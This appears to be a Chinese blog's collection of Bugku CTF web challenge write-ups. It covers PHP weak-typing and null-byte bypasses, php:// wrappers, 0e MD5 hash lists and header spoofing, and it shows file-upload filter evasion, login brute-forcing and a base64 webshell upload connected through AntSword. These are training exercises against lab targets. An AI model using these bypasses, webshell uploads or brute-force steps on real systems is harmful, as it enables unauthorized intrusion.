<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/never%20give%20up/1T%5D3K47GRNIAD83BXL%5DFMKP.png" alt=""></p>
<p>还有一串base64编码过的数据，再去解密一下base64</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/never%20give%20up/GK%60TTFC%5B3%7BA9V%40XIWL%7BXGE5.png" alt=""></p>
<p>还剩一层url编码，我们再解一遍url</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/never%20give%20up/M%28S7~6JS88E96NAC%60P%29Q_B9.png" alt=""></p>
<p>解密后得到源码，拼凑起来就是下面这样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;www.bugku.com&#39;;&lt;&#x2F;script&gt; </span><br><span class="line">&lt;!--&quot;;if(!$_GET[&#39;id&#39;])</span><br><span class="line">&#123;</span><br><span class="line">	header(&#39;Location: hello.php?id&#x3D;1&#39;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$a&#x3D;$_GET[&#39;a&#39;];</span><br><span class="line">$b&#x3D;$_GET[&#39;b&#39;];</span><br><span class="line">if(stripos($a,&#39;.&#39;))</span><br><span class="line">&#123;</span><br><span class="line">	echo &#39;no no no no no no no&#39;;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line">$data &#x3D; @file_get_contents($a,&#39;r&#39;);</span><br><span class="line">if($data&#x3D;&#x3D;&quot;bugku is a nice plateform!&quot; and $id&#x3D;&#x3D;0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!&#x3D;4)</span><br><span class="line">&#123;</span><br><span class="line">	require(&quot;f4l2a3g.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	print &quot;never never never give up !!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;--&gt;</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
<blockquote>
<p>解释一波代码：</p>
<p>1.首先限制id必须为非零非空</p>
<p>2.一共需要传参a,b,id三个参数</p>
<p>3.匹配a中是否有.这个符号</p>
<p>4.读取变量a的值到data中，用了file_get_contents函数，所以a的值必须为数据流</p>
<p>5.判断data等于字符串&quot;bugku is a nice plateform!&quot;，id==0，b的长度要大于5</p>
<p>6.字符串1114要与字符串111连接变量b的第一个字符构成正则匹配，而且b的第一个字符不能为4</p>
</blockquote>
<p>好，那我们要采用什么姿势绕过呢？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对于参数id，因为是&#x3D;&#x3D;弱类型比较，可以使用0abc之类的绕过，因为0abc&#x3D;&#x3D;比较为0</span><br><span class="line"></span><br><span class="line">对于参数a，因为是读取数据流，我们可以使用php协议中的input，即php:&#x2F;&#x2F;input，它可以访问请求的原始数据的只读流，所以我们用post发送数据&quot;bugku is a nice plateform!&quot;</span><br><span class="line"></span><br><span class="line">对参数b，我们可以使用空字符对付它。因为eregi()函数存在空字符截断漏洞，当参数中的待匹配字符串或者正则表达式遇到空字符则截断，会丢弃后面的数据。我们可以构造%0012345。这里%00是空格经过url编码后的形式，值得注意的是，这里是一共6个长度。</span><br></pre></td></tr></table></figure>
<p>好，我们去试试吧</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/never%20give%20up/S%5BR1_E5%25%5DYA_LKG%28RSZ_VE6.png" alt=""></p>
<p>成功绕过拿到flag了。</p>
<p>其实，这里有个问题，就是源码中并没有限制我们访问f4l2a3g.txt文件，只是告诉我们可以通过这种构造方式访问。</p>
<p>所以我们可以直接访问得到flag，这也是一个思维点，我觉得。</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/never%20give%20up/P%5DHY~JA4DCBADUQYCEJCT%28X.png" alt=""></p>
</li>
<li>
<h2 id="welcome-to-bugkuctf"><a class="header-anchor" href="#welcome-to-bugkuctf">¶</a>welcome to bugkuctf</h2>
<p>题目挂掉，暂时跳过</p>
</li>
<li>
<h2 id="过狗一句话"><a class="header-anchor" href="#过狗一句话">¶</a>过狗一句话</h2>
<p>题目还是挂了，flag被删除，跳过</p>
</li>
<li>
<h2 id="字符？正则？"><a class="header-anchor" href="#字符？正则？">¶</a>字符？正则？</h2>
<p>打开页面，给出一串php代码</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E5%AD%97%E7%AC%A6%EF%BC%9F%E6%AD%A3%E5%88%99%EF%BC%9F/GUB%7D33H%7BYS%29_%2410R4TS%24CK8.png" alt=""></p>
<p>看到有函数preg_match，它的功能为用正则表达式匹配字符串，匹配成功返回1，并把匹配到的值赋值给match，否则返回0。最后有一个if判断，也就是我们上边匹配成功，即可输出flag。</p>
<p>好，思路很清晰，就是匹配正则表达式~</p>
<p>题目中的正则表达式为：/key.*key.{4,7}key:/./(.*key)[a-z][[:punct:]]/i</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">key  		普通字符key</span><br><span class="line">. 			除了换行符之外的任意字符，.*匹配0个或多个正则表达式</span><br><span class="line">key  		普通字符key</span><br><span class="line">.&#123;4,7&#125;		4个到7个除了换行符之外的任意字符(包括4，不包括7)</span><br><span class="line">key  		普通字符key</span><br><span class="line">:    		普通字符:</span><br><span class="line">\&#x2F;   		这里的\为转义字符,也就是表示&#x2F;</span><br><span class="line">.			除了换行符之外的任意字符</span><br><span class="line">\&#x2F;   		这里的\为转义字符,也就是表示&#x2F;</span><br><span class="line">.			除了换行符之外的任意字符，.*匹配0个或多个正则表达式</span><br><span class="line">key  		普通字符key</span><br><span class="line">[a-z]		匹配a到z之间的字符</span><br><span class="line">[:punct:]	表示匹配 !&quot;#$%&amp;’()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[]^_&#96;&#123;|&#125;~.中的任意一个</span><br><span class="line">i		    表示忽略大小写</span><br></pre></td></tr></table></figure>
<p>这里我构造成：<code>http://123.206.87.240:8002/web10?id=keykey....key:/./keya:</code></p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E5%AD%97%E7%AC%A6%EF%BC%9F%E6%AD%A3%E5%88%99%EF%BC%9F/0KY3%28S%7BG868TM%299FQ%7D%24%24%25%28T.png" alt=""></p>
<p>成功拿到flag！</p>
</li>
<li>
<h2 id="前女友-SKCTF"><a class="header-anchor" href="#前女友-SKCTF">¶</a>前女友(SKCTF)</h2>
<p>好吧，题目又是挂的，gg</p>
</li>
<li>
<h2 id="login1-SKCTF"><a class="header-anchor" href="#login1-SKCTF">¶</a>login1(SKCTF)</h2>
<p>不会吧，阿sir，又是挂的题</p>
</li>
<li>
<h2 id="你从哪里来"><a class="header-anchor" href="#你从哪里来">¶</a>你从哪里来</h2>
<p>终于是道能访问的题了，不容易。</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5/A8_%606DQ%7B0%40UT%60%243KCV%294LHX.png" alt=""></p>
<p>提示我们要从谷歌访问，于是抓个包改包，加referer头</p>
<p>referer:<code>https://www.google.com</code></p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5/2U%7B0ZAM%24%5DIVCR%5D7XCG3~0%7DF.png" alt=""></p>
<p>啊这，flag就出来了？太简单了。。。</p>
</li>
<li>
<h2 id="md5-collision-NUPT-CTF"><a class="header-anchor" href="#md5-collision-NUPT-CTF">¶</a>md5 collision(NUPT_CTF)</h2>
<p>打开页面，提示我们输入a</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/md5%20collision%28NUPT_CTF%29/~%60%405THX%7B429ORPTH6GR2MQ1.png" alt=""></p>
<p>试试get输入？</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/md5%20collision%28NUPT_CTF%29/P617F2S%7DE5Q4XCQXYT9I%40%293.png" alt=""></p>
<p>应该可能是要输入题目提示的md5，然后进行一个绕过。</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/md5%20collision%28NUPT_CTF%29/UN%60%7DE0VCT4%7DRUHMKX6H1UCJ.png" alt=""></p>
<p>flag爆出来了。猜测源码应该是用a传进来的md5值和它源码的另一个md5值进行比较。这里再说明一下，php处理哈希字符串时，会利用!=或者==进行一个比较，每一个&quot;0E&quot;开头的哈希值都会被解释成0。因此两个&quot;0E&quot;开头的哈希值会被php认为相等。</p>
<p>这里记录一下一些使用0e开头的md5和原值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li>
<h2 id="程序员本地网站"><a class="header-anchor" href="#程序员本地网站">¶</a>程序员本地网站</h2>
<p>打开页面，提示我们从本地访问</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%AB%99/H%7BV6G1KGD14%29HAGV8B7WCHL.png" alt=""></p>
<p>那我们就抓包加个xff头，X-Forwarded-For:127.0.0.1</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%AB%99/%5DJCHINA92U0KSN0A%7BW%244YW6.png" alt=""></p>
<p>flag就出来了</p>
</li>
<li>
<h2 id="各种绕过"><a class="header-anchor" href="#各种绕过">¶</a>各种绕过</h2>
<p>这次是给我们代码，通过绕过进行获取flag</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87/7R%5BB3%290OA%5B%7BSATZJ8L%7BTLAX.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">$_GET[<span class="string">&#x27;id&#x27;</span>] = urldecode($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">$flag = <span class="string">&#x27;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;uname&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">&#x27;uname&#x27;</span>] == $_POST[<span class="string">&#x27;passwd&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;passwd can not be uname.&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">&#x27;uname&#x27;</span>]) === sha1($_POST[<span class="string">&#x27;passwd&#x27;</span>])&amp;($_GET[<span class="string">&#x27;id&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.$flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;sorry!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>总的看下来，需要我们通过get提交参数id和参数uname，还有通过post提交一个passwd参数</p>
<p>第一个if判断，判断是否提交uname和passwd</p>
<p>第二个if判断，uname的值和passwd的值一样就输出提示，所以我们这里两个参数的值不能一样</p>
<p>第三个if判断，sha1()函数是用来计算字符串的SHA-1散列，这里要求经过sha1函数处理的两个值一样并且参数id等于margin，即可输出flag</p>
<p>我们可以用数组来进行绕过sha1函数，因为sha1函数无法处理数组，会返回false。两个false，条件就成立了，就可以绕过。</p>
<p>所以我们这么构造一下</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87/KGYCCZ52%25%28F%7DD%24R%24~XQX2G2.png" alt=""></p>
<p>flag出来了，姿势使用对了。</p>
</li>
<li>
<h2 id="web8"><a class="header-anchor" href="#web8">¶</a>web8</h2>
<p>打开，首先是一波代码审计<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/bugku/web8/%24O9CMJNNH%248%28%7B0R90%28F_%40NO.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输出flag需要满足下面几个条件：</span><br><span class="line">1.get传值的ac参数不为空</span><br><span class="line">2.参数f的值从文件fn中获取</span><br><span class="line">3.参数ac需要满足等于参数f</span><br></pre></td></tr></table></figure>
<p>所以我们可以使用php伪协议进行构造<br>
第一种方法，使用php://input协议</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/web8/D%5DHZ9FHB%5BG8X~TW%5DP5X%60CIJ.png" alt=""></p>
<p>第二种方法，使用data://text/plain协议</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/web8/K28D7J0%5D%24JR6S41%7BWB%29%5BPL8.png" alt=""></p>
<p>补充：</p>
<p>因为一直对题目的txt提示感到疑惑，想着可能file_get_contents读取的文件是存在的，后面乱试了一通index.txt，fn.txt<br>
ac.txt…flag.txt，发现是存在一个flag.txt</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/web8/D%28BU2~CWBAOBQWP%60TVAE0AN.png" alt=""></p>
<p>然后可以构造取得flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/bugku/web8/%7BYUA%25%7B9%7D6W7UY%24%29PU3TDGMP.png" alt=""></p>
</li>
<li>
<h2 id="细心"><a class="header-anchor" href="#细心">¶</a>细心</h2>
<p>打开是一个404页面<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E7%BB%86%E5%BF%83/OK6R%5BVSY%5B%7B0AL215GT2GR%245.png" alt=""><br>
心头一动，莫非又是一道挂掉的题？？！<br>
但和之前挂的题有点不一样，用御剑扫一下<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E7%BB%86%E5%BF%83/9%60S0%5B9Z%24~~7CR%5D1EBN3PTTO.png" alt=""><br>
扫出一个robots.txt，访问一波<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E7%BB%86%E5%BF%83/TRVX_OR7BM_%5D30%28%29W%7BSF%5BDW.png" alt=""><br>
还有个resusl.php页面，打开<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E7%BB%86%E5%BF%83/MON_0I~~NX9G%60%25I%5B7%29%7D~LBA.png" alt=""><br>
提示我们需要管理员，页面还有个get传值，那我们试试传值x=admin<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E7%BB%86%E5%BF%83/HZ%7B%5B_AJ5_VG%7DZBSEA4%2921NK.png" alt=""><br>
flag出来了！</p>
</li>
<li>
<h2 id="求getshell"><a class="header-anchor" href="#求getshell">¶</a>求getshell</h2>
<p>打开页面是一道文件上传题<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E6%B1%82getshell/YFQ0%40IG%40U%40S2_BJ0%7DD3TAH6.png" alt=""><br>
试过了很多种方法，做成图片马上传，改后缀，改content-type类型都是失败，也试了php的一些绕过姿势.php|.php5|.php4|.php3|.php2|.php1|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|.pHp1等等</p>
<p>后面找了资料发现上面还有个content-type头，multipart/form-data大写能绕过waf的严格检测，所以去试了一波<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E6%B1%82getshell/AD%28GHI7ZH1OLA%24%5DS_LC8880.png" alt=""></p>
<p>总结：</p>
<p>1.第一个content-type头大写绕过waf检测<br>
2.上传文件的后缀名改成php5绕过后缀检测<br>
3.上传的content-type头得是image类型满足图片的要求</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>新版bugku平台Writeup~持续更新中</title>
    <url>/posts/49040/</url>
    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
<p>前段日子，新版bugku平台改版上线，然后我就兴冲冲的去刷了一波😂<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%60%5DEGP1RJ%5D%7DAC%5D_%5D85OHB%257U.png" alt=""><br>
大部分题还是上线的老bugku平台的题，但也在逐渐上线新题，所以开了个文章记录下新题的做题过程（会慢慢更新）。有大部分web的题我在博客的另一篇文章写过，这里不重复写了，只记录一些想记录的题。<br>
想看的师傅移步到这里<code>https://www.wlhhlc.top/posts/55334/</code>噢。</p>
<h2 id="Web"><a class="header-anchor" href="#Web">¶</a>Web</h2>
<h3 id="xxx二手交易市场"><a class="header-anchor" href="#xxx二手交易市场">¶</a>xxx二手交易市场</h3>
<p>题目提示是：本人现实碰到的题目，无提示勿问。好家伙，莫非要渗透一波？？<br>
打开是一个购物市场页面<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/G28I_WP%25XFU%2905H%60NC600YM.png" alt=""><br>
浏览完一遍，发现有注册和登录功能。<br>
在登录尝试用admin登录，提示限制得6位以上。准备采取爆破，因为验证码是只是前段验证，爆破是可行的(不过就算不是前段验证，训练一波验证码识别也可以哈哈哈~)<br>
但用户名和密码同时爆破工作量有点大，所以我们去注册页面去尝试爆破注册，看看能否爆破出已经存在的用户名<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/U6CVM4G8VJOZ%5D2CR9KW0LNW.png" alt=""><br>
burpsuite启动！<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/5LVOQBO085X%25U9~Q6KR8%28QP.png" alt=""><br>
爆破出存在用户名123456，接着去登录页面进行爆破，拿到密码为123456<br>
芜湖，登录！✌️<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/QZX%29EN3X%40%7DDW~6FSXD_OU_5.png" alt=""><br>
发现头像是图片文件上传点，然后熟悉的一梭子打下去（图片马，抓包）<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/T0RM~~4R%24AQSD2R6_814M0D.png" alt=""><br>
发现我们传送的数据是base64的数据流，我们去写一句话木马，然后base64编码<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/XN97XRJKMI%28EO%25H%256YFLQ%7DC.png" alt=""><br>
把拦截的图片数据改成经过base64编码后的一句话木马，并且把前面的jpeg改成php，gogogo！<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/7%7BJU8%7B2U%40VT5DZ44%5BUMU%25UE.png" alt=""><br>
上传成功，蚁剑启动！<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/QQ%E6%88%AA%E5%9B%BE20201230103931.png" alt=""><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/79IMCM%5DG~E%60B5%29%5BERZWUL2B.png" alt=""><br>
flag成功拿到，收工。</p>
<h3 id="冬至红包"><a class="header-anchor" href="#冬至红包">¶</a>冬至红包</h3>
<p>至今仍不知道那天的红包有多大<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E5%86%AC%E8%87%B3%E7%BA%A2%E5%8C%85/1%5D%60_N%29%5DP4Q%28M%29%40D4I7B%5B153.png" alt=""><br>
打开题目，一段php代码，考绕过的功底了<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E5%86%AC%E8%87%B3%E7%BA%A2%E5%8C%85/1NYXWXRZ8%7DG%5B57CFJ%28YMLN8.png" alt=""><br>
首先审计一下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    $exam = <span class="string">&#x27;return\&#x27;&#x27;</span>.sha1(time()).<span class="string">&#x27;\&#x27;;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;./?flag=&#x27;</span>.$exam.<span class="string">&#x27;&quot;&gt;Click here&lt;/a&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">&#x27;flag&#x27;</span>]) != strlen($exam)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;长度不允许&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/`|&quot;|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is&#x27;</span>, $_GET[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;关键字不允许&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">eval</span>($_GET[<span class="string">&#x27;flag&#x27;</span>]) === sha1($flag)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;马老师发生甚么事了&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>第一个if：判断是否传参变量flag，没有就输出$exam和一些html<br>
第二个if：判断flag变量的长度是否和$exam的长度相等<br>
第三个if：过滤一些关键字符<br>
第四个if：eval执行flag变量里面的内容，并且要等于flag变量的SHA-1散列</p>
</blockquote>
<p>这里我实在是不知道是如何能执行后等于sha1值，我觉得题目考点也不在这。所以我们采取绕过的形式，可以看到相等后会输出flag.php里面变量$flag的值，而现在又可以执行我们传入的flag变量内容，所以我们直接构成语句达到输出$flag的目的<br>
为了绕过flag过滤，我们可以使用php中$$引用变量的特性和php短写标签的特性</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//$$变量使用</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    $$a = <span class="string">&#x27;100&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> $a.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> $$a.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> $abc;</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*输出值分别如下：</span></span><br><span class="line"><span class="comment">abc</span></span><br><span class="line"><span class="comment">100</span></span><br><span class="line"><span class="comment">100</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//php短标签特性</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.&lt;?php echo &quot;abc&quot;?&gt;</span></span><br><span class="line"><span class="comment">2.&lt;?=&quot;abc&quot;;?&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">上面两个语句都是输出abc</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我们先点击clickhere获取$exam的值:<br>
flag=return’5e22e75193f17cf3e608058536d49e4a7fd7dc56’;<br>
所以$exam=return’5e22e75193f17cf3e608058536d49e4a7fd7dc56’;<br>
构造url如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?flag&#x3D;$w&#x3D;blag;$w&#123;0&#125;&#x3D;f;?&gt;888888888888888888888;&lt;?&#x3D;$$w;?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E5%86%AC%E8%87%B3%E7%BA%A2%E5%8C%85/MB%29%40%283X4J_ZZ%7B6SDWZ%401DTU.png" alt=""><br>
成功拿到flag，就是没红包了呜呜呜。</p>
<h3 id="安慰奖"><a class="header-anchor" href="#安慰奖">¶</a>安慰奖</h3>
<p>打开页面，返回一个空白页面，御剑启动!⚡️<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/%295N%7B4KOUA3%7DZI%28R%40JN~7V84.png" alt=""><br>
扫描到存在index.php.bak文件，应该是备份文件，下载下来，打开得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!-- YmFja3Vwcw== --&gt;&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $username = <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> $cmd = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$username,$cmd</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = $cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span 